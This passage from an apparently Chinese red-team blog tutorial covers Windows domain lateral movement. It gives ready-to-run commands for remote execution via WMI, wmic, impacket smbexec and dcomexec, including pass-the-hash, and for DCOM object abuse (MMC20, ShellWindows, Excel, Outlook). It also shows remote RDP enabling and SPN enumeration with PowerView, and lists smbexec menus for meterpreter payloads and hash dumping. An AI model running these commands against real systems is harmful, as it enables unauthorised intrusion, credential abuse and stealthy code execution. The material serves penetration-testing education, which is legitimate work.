$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902130614.png"></p>
<h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p>
<pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名
$User&#x3D;&quot;teamssix.com\administrator&quot;

# 指定目标系统密码
$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential中
$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 在远程系统中运行 calc.exe 命令
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902131658.png"></p>
<p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p>
<h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p>
<pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1

# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1
或者
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
<pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902135523.png"></p>
<p>使用 wmic 远程重启目标计算机</p>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="0x23-SMBExec-与-DCOM-的使用"><a href="#0x23-SMBExec-与-DCOM-的使用" class="headerlink" title="0x23 SMBExec 与 DCOM 的使用"></a>0x23 SMBExec 与 DCOM 的使用</h1><h2 id="1、SMBExec"><a href="#1、SMBExec" class="headerlink" title="1、SMBExec"></a>1、SMBExec</h2><p>利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec</p>
<h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><p>C++ 版项目地址：<a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p>
<p>一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。</p>
<h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p>
<pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902153131.png"></p>
<h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
<p>这里安装以 Kali 为例</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。</p>
<p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p>
<pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息2. System Exploitation  &#x2F;&#x2F; 执行系统命令3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希4. Options              &#x2F;&#x2F; 一些其他操作5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择菜单 1 System Enumeration 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择菜单 2 System Exploitation 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload7. Remote system access                  &#x2F;&#x2F; 远程访问系统8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择菜单 3 Obtain Hashes 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择菜单 4 Options 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取目标系统 UAC 的状态</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163458.png"></p>
<p>获取目标系统中的网络共享目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163631.png"></p>
<p>获取本地哈希</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902161205.png"></p>
<h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p>
<p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p>
<p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p>
<p>它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p>
<p>攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p>
<p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。</p>
<p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p>
<h3 id="在本地通过-DCOM-执行命令"><a href="#在本地通过-DCOM-执行命令" class="headerlink" title="在本地通过 DCOM 执行命令"></a>在本地通过 DCOM 执行命令</h3><p>1、获取 DCOM 程序列表</p>
<p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</p>
<pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance</p>
<pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2、使用 DCOM 执行任意命令</p>
<p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。</p>
<p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p>
<pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p>
<pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png"></p>
<p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p>
<h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p>
<ul>
<li>具有本地管理员权限的 PowerShell</li>
<li>需要关闭目标系统的防火墙。</li>
<li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li>
</ul>
<p>1、调用 MMC20.Application 远程执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))
$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)
或者
[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175722.png"></p>
<p>2、调用 ShellWindows 远程执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))
$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
或者
[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175207.png"></p>
<p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p>
<p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p>
<p>3、调用 Excel.Application 远程执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))$com.DisplayAlerts &#x3D; $false$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>4、调用 ShellBrowserWindow 远程执行命令</p>
<blockquote>
<p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))
$com.Document.Application.shellExecute(&quot;calc.exe&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>5、调用 Visio.Application 远程执行命令</p>
<blockquote>
<p>前提是目标安装了 Visio</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))
$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>6、调用 Outlook.Application 远程执行命令</p>
<blockquote>
<p>前提是目标安装了 Outlook</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))
$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="dcomexec-py-脚本"><a href="#dcomexec-py-脚本" class="headerlink" title="dcomexec.py 脚本"></a>dcomexec.py 脚本</h3><p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM</p>
<p>dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。</p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者只执行一条命令</p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果只知道 hash 也可以用 hash 去连接</p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210904110328.png"></p>
<h1 id="0x24-SPN-的应用"><a href="#0x24-SPN-的应用" class="headerlink" title="0x24 SPN 的应用"></a>0x24 SPN 的应用</h1><h2 id="0、前言-5"><a href="#0、前言-5" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p>
<p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p>
<h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p>
<p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p>
<p>Kerberos 协议中的名称解释：</p>
<ul>
<li>Client: 访问服务的客户端</li>
<li>Server: 提供服务的服务器</li>
<li>KDC (Key Distribution Center): 密钥分发中心</li>
<li>AS (Authentication Service): 认证服务器</li>
<li>TGS (Ticket Granting Service): 票据授予服务</li>
<li>DC (Domain Controller): 域控制器</li>
<li>AD (Account Database): 用户数据库</li>
<li>TGT (Ticket Granting Ticket): 票证授予票证</li>
<li>ST (Servre Ticket): 服务票据</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png"></p>
<p>根据上图，这里一步一步进行解释</p>
<p><strong>第一阶段：Clinet 与 AS</strong></p>
<p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p>
<p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p>
<ul>
<li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li>
<li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li>
</ul>
<p>至此，第一阶段通信完成。</p>
<p><strong>第二阶段：Clinet 与 TGS</strong></p>
<p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p>
<p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p>
<p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p>
<ul>
<li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li>
<li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li>
<li>第三部分：使用 TGS 密钥加密的 TGT</li>
</ul>
<p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p>
<pre><code>接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。

之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。

此时 TGS 将向客户端发起响应，响应信息包含两部分：
</code></pre>
<ul>
<li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li>
<li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li>
</ul>
<p>至此，第二阶段通信完成。</p>
<p><strong>第三阶段：Clinet 与 Server</strong></p>
<p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p>
<p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p>
<ul>
<li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li>
<li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li>
</ul>
<p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p>
<p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p>
<p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p>
<p>这里可以再通过时序图加深下印象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906174237.jpg"></p>
<p>注意点：</p>
<ul>
<li>KDC 服务默认会安装在一个域的域控中</li>
<li>Kerberos 认证采用对称加密算法</li>
<li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li>
<li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li>
<li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
</ul>
<h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p>
<p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p>
<p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p>
<p>SPN 格式如下：</p>
<pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>serviceclass（必选）：服务组件名称</p>
<p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p>
<p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p>
<p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p>
</blockquote>
<h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p>
<pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Exchange 服务</p>
<pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>RDP 服务</p>
<pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>WSMan/WinRM/PSRemoting 服务</p>
<pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p>
<p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p>
<p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p>
<h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectoryget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dllget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

